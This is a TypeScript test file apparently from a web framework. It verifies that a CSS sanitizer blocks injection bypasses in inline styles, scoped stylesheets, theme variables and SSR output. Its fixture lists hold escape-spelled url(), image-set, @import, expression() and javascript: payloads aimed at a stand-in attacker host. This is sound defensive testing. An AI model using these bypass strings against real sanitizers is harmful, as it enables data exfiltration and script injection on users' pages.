/**
 * The inline-style policy, across every way a style reaches an element.
 *
 * One declaration list of bypass attempts runs through the string form, the
 * object form, per-property getters, whole-style getters, `html```
 * interpolation, `bindAttrs`, and both SSR serializers. Two properties are
 * asserted for each:
 *
 *   1. SAFETY — no blocked construct survives, in any spelling the CSS parser
 *      would read as that construct (case, escapes of all three kinds,
 *      whitespace, nesting, custom properties).
 *   2. PARITY — the string form and the object form of the same declaration
 *      reach the same verdict. They used not to: `behavior` and `-moz-binding`
 *      are only blocked when the property name is part of the check, which the
 *      object form never did.
 *
 * FALSE POSITIVES INVESTIGATED: CSS comments cannot join tokens under CSS
 * Syntax 3 — `u/＊＊/rl(` is an identifier `u`, a comment and a function
 * `rl(`, not `url(` — so the sanitizer deliberately does not strip comments
 * before matching. The only engine that honoured comment-split `expression()`
 * was legacy IE, which is outside the support floor.
 */

import { describe, expect, it } from "vitest";
import { html } from "../src/core/rendering/htm";
import { div } from "../src/core/rendering/html";
import { signal } from "../src/core/signals/signal";
import { createTheme } from "../src/ecosystem/ui/componentAdapter";
import { collectStream, renderToStream, renderToString } from "../src/platform/ssr";
import { bindAttrs } from "../src/ui/reactiveAttr";
import { removeScopedStyle, scopedStyle } from "../src/ui/scopedStyle";
import { sanitizeCSSDeclaration, sanitizeCSSValue, sanitizeStyleAttribute } from "../src/utils/sanitize";

/** [property, value] pairs that must never reach an element. */
const BLOCKED: [string, string][] = [
  ["background", "url(https://attacker.example/leak)"],
  ["background", "URL(https://attacker.example/leak)"],
  ["background", "url (https://attacker.example/leak)"],
  ["background", "url('javascript:alert(1)')"],
  ["background", "u\\rl(https://attacker.example/leak)"],
  ["background", "\\75 rl(https://attacker.example/leak)"],
  ["background", "\\000075rl(https://attacker.example/leak)"],
  ["background", "u\\\nrl(https://attacker.example/leak)"],
  ["background", "url\\28 https://attacker.example/leak)"],
  ["background-image", "image-set('https://attacker.example/a.png' 1x)"],
  ["background-image", "-webkit-image-set(url(https://attacker.example/a.png) 1x)"],
  ["background-image", "image('https://attacker.example/a.png')"],
  ["background-image", "src('https://attacker.example/a.png')"],
  ["background-image", "linear-gradient(red, blue), url(https://attacker.example/a.png)"],
  ["background-image", "cross-fade(url(https://attacker.example/a.png), red 50%)"],
  ["--x", "url(https://attacker.example/leak)"],
  ["width", "expression(alert(1))"],
  ["width", "EXPRESSION(alert(1))"],
  ["width", "e\\xpression(alert(1))"],
  ["behavior", "url(x.htc)"],
  ["behavior", "x.htc"],
  ["-moz-binding", "url(http://attacker.example/x.xml#y)"],
  ["-moz-binding", "x.xml#y"],
  ["filter", "progid:DXImageTransform.Microsoft.Alpha(opacity=50)"],
  ["background", "javascript:alert(1)"],
  ["background", "vbscript:msgbox(1)"],
];

/** Legitimate values that must pass untouched — the policy is not a CSS ban. */
const ALLOWED: [string, string][] = [
  ["color", "red"],
  ["width", "calc(100% - 2rem)"],
  ["color", "rgba(0, 0, 0, 0.5)"],
  ["background", "linear-gradient(red, blue)"],
  ["transform", "translate(10px, 20px) rotate(3deg)"],
  ["font-family", '"Helvetica Neue", sans-serif'],
  ["grid-template-columns", "repeat(3, minmax(0, 1fr))"],
  ["--brand", "#ff0066"],
  ["color", "var(--brand)"],
];

function kebab(name: string): string {
  return name.startsWith("--") ? name : name.replace(/[A-Z]/g, (m) => `-${m.toLowerCase()}`);
}

describe("CSS policy — primitives", () => {
  for (const [property, value] of BLOCKED) {
    it(`blocks ${property}: ${JSON.stringify(value)} in string and declaration form alike`, () => {
      expect(sanitizeCSSDeclaration(property, value)).toBe("");
      expect(sanitizeStyleAttribute(`${property}: ${value}`)).not.toMatch(/url|expression|image|src\(|binding|progid/i);
    });
  }

  for (const [property, value] of ALLOWED) {
    it(`allows ${property}: ${JSON.stringify(value)}`, () => {
      expect(sanitizeCSSDeclaration(property, value)).toBe(value);
      expect(sanitizeCSSValue(value)).toBe(value);
    });
  }

  it("keeps safe declarations beside a dropped one", () => {
    const out = sanitizeStyleAttribute("color: red; background: url(https://x.example/a); width: 10px");
    expect(out).toContain("color: red");
    expect(out).toContain("width: 10px");
    expect(out).not.toContain("url(");
  });

  it("a quoted `;` inside a value does not split the declaration list", () => {
    expect(sanitizeStyleAttribute("content: 'a;background:url(https://x.example/a)'")).not.toContain("url(");
  });

  it("control characters do not fabricate or hide a function", () => {
    // U+0000 becomes U+FFFD in the CSS parser, so `u\0rl(` is not `url(`: kept.
    expect(sanitizeCSSValue("u\u0000rl(x)")).toBe("u\u0000rl(x)");
    // A form feed IS CSS whitespace; the sanitizer's conservative reading
    // strips it and refuses.
    expect(sanitizeCSSValue("url\f(x)")).toBe("");
  });
});

describe("CSS policy — every writer reaches the same verdict", () => {
  for (const [property, value] of BLOCKED) {
    it(`${property}: ${JSON.stringify(value)}`, async () => {
      const name = kebab(property);
      const declaration = `${name}: ${value}`;
      const [live, setLive] = signal("color: red");
      const [liveValue, setLiveValue] = signal("red");

      const elements: HTMLElement[] = [
        div({ style: declaration }),
        div({ style: { [property]: value } }),
        div({ style: { [property]: () => value } }),
        div({ style: () => ({ [property]: value }) }),
        div({ style: () => live() }),
        div({ style: { [property]: () => liveValue() } }),
        html`<div style=${declaration}></div>` as HTMLElement,
        html`<div style="color: red; ${declaration}"></div>` as HTMLElement,
      ];
      const viaBindAttrs = document.createElement("div");
      bindAttrs(viaBindAttrs, { style: declaration });
      elements.push(viaBindAttrs);

      // Reactive updates, after first render.
      setLive(declaration);
      setLiveValue(value);

      for (const el of elements) {
        const style = el.getAttribute("style") ?? "";
        expect(style).not.toMatch(/url\(|expression|image\(|image-set|src\(|binding|progid|javascript|vbscript/i);
        const [string, stream] = [renderToString(el), await collectStream(renderToStream(el))];
        expect(stream).toBe(string);
        expect(string).not.toMatch(/url\(|expression|image\(|image-set|src\(|binding|progid|javascript|vbscript/i);
      }
    });
  }

  it("SSR re-applies the policy to foreign DOM styled without the framework", () => {
    const el = document.createElement("div");
    Element.prototype.setAttribute.call(el, "style", "color: red; background: url(https://x.example/a)");
    const out = renderToString(el);
    expect(out).toContain("color: red");
    expect(out).not.toContain("url(");
  });
});

describe("CSS policy — property-qualified rules compare the EXACT property name", () => {
  // Regression: the rule once matched `behavior:` as a substring of the joined
  // `property:value` text, silently dropping every property whose name merely
  // ENDS in "behavior", on the object form and the string form alike.
  const ORDINARY: [string, string][] = [
    ["scroll-behavior", "smooth"],
    ["overscroll-behavior", "contain"],
    ["overscroll-behavior-x", "none"],
    ["overscroll-behavior-y", "auto"],
    ["--nav-behavior", "sticky"],
    ["--moz-binding-note", "text"],
  ];

  for (const [property, value] of ORDINARY) {
    it(`keeps ${property}: ${value} on every form`, () => {
      expect(sanitizeCSSDeclaration(property, value)).toBe(value);
      expect(sanitizeStyleAttribute(`${property}: ${value}`)).toContain(`${property}: ${value}`);
      expect(div({ style: { [property]: value } }).getAttribute("style")).toContain(`${property}: ${value}`);
      const [live] = signal(value);
      expect(div({ style: { [property]: () => live() } }).getAttribute("style")).toContain(`${property}: ${value}`);
    });
  }

  it("the camelCase object keys resolve to the same kept declarations", () => {
    const el = div({ style: { scrollBehavior: "smooth", overscrollBehavior: "contain" } });
    expect(el.getAttribute("style")).toContain("scroll-behavior: smooth");
    expect(el.getAttribute("style")).toContain("overscroll-behavior: contain");
  });

  it("still blocks the real property-qualified constructs, whatever their value", () => {
    for (const [property, value] of [
      ["behavior", "x.htc"],
      ["behavior", ""],
      ["BEHAVIOR", "none"],
      ["-moz-binding", "x.xml#y"],
      ["filter", "progid:DXImageTransform.Microsoft.Alpha(opacity=50)"],
      ["filter", "PROGID : DX.x(a=1)"],
      ["-ms-filter", "'progid:DX.x(a=1)'"],
    ] as const) {
      expect(sanitizeCSSDeclaration(property, value), `${property}: ${value}`).toBe("");
    }
    // An ordinary filter is not a progid filter.
    expect(sanitizeCSSDeclaration("filter", "blur(2px)")).toBe("blur(2px)");
  });
});

describe("scopedStyle() stylesheet text — the canonical CSS constructs, one decoder", () => {
  const cssOf = (scope: string) => document.head.querySelector(`style[data-sibu-scope="${scope}"]`)?.textContent ?? "";

  const BYPASSES: [string, string][] = [
    ["@import without a trailing semicolon", '.a { color: red; }\n@import "https://attacker.example/x.css"'],
    ["@import before a block, no semicolon", '@import "https://attacker.example/x.css" .a { color: red; }'],
    ["image-set() string URL", '.a { background-image: image-set("https://attacker.example/a.png" 1x); }'],
    ["-webkit-image-set()", ".a { background-image: -webkit-image-set(url(https://attacker.example/a.png) 1x); }"],
    ["image() string URL", '.a { background-image: image("https://attacker.example/a.png"); }'],
    ["src() string URL", '.a { background-image: src("https://attacker.example/a.png"); }'],
    // A CSS escape: `\` + newline is a line continuation; `\r` (backslash, r)
    // is the letter r. Both spell `url(` to a CSS parser.
    ["escaped-newline url(", ".a { background: u\\\nrl(https://attacker.example/a); }"],
    ["simple-escape url(", ".a { background: u\\rl(https://attacker.example/a); }"],
    [
      "nested url() inside image-set",
      ".a { background: image-set(url(https://attacker.example/a) 1x, url(https://attacker.example/b) 2x); }",
    ],
  ];

  for (const [label, css] of BYPASSES) {
    it(`PoC: strips ${label}`, () => {
      const { scope } = scopedStyle(css);
      expect(cssOf(scope)).not.toContain("attacker.example");
      removeScopedStyle(scope);
    });
  }

  it("keeps property names that merely END in a blocked one", () => {
    const { scope } = scopedStyle(".a { scroll-behavior: smooth; overscroll-behavior: contain; color: red; }");
    const css = cssOf(scope);
    expect(css).toContain("scroll-behavior: smooth");
    expect(css).toContain("overscroll-behavior: contain");
    removeScopedStyle(scope);
  });

  it("still strips the real property-qualified constructs", () => {
    const { scope } = scopedStyle(".a { behavior: url(x.htc); -moz-binding: url(x.xml#y); color: red; }");
    const css = cssOf(scope);
    expect(css).not.toMatch(/(^|[;{\s])behavior\s*:/);
    expect(css).not.toContain("x.xml");
    expect(css).toContain("color: red");
    removeScopedStyle(scope);
  });
});

describe("theme variables — the inline-style policy applies to every inline writer", () => {
  it("PoC: a blocked theme variable is never written; safe ones are, and updates are judged too", () => {
    const theme = createTheme({
      prefix: "t",
      variables: { "--bg": "url(https://attacker.example/leak)", "--fg": "#123456" },
    });
    const root = document.createElement("div");
    const release = theme.applyTo(root);
    expect(root.style.getPropertyValue("--bg")).toBe("");
    expect(root.style.getPropertyValue("--fg").trim()).toBe("#123456");
    theme.setTheme({ variables: { "--fg": "image-set('https://attacker.example/a.png' 1x)", "--ok": "2px" } });
    expect(root.getAttribute("style") ?? "").not.toContain("attacker.example");
    expect(root.style.getPropertyValue("--ok").trim()).toBe("2px");
    release();
  });
});
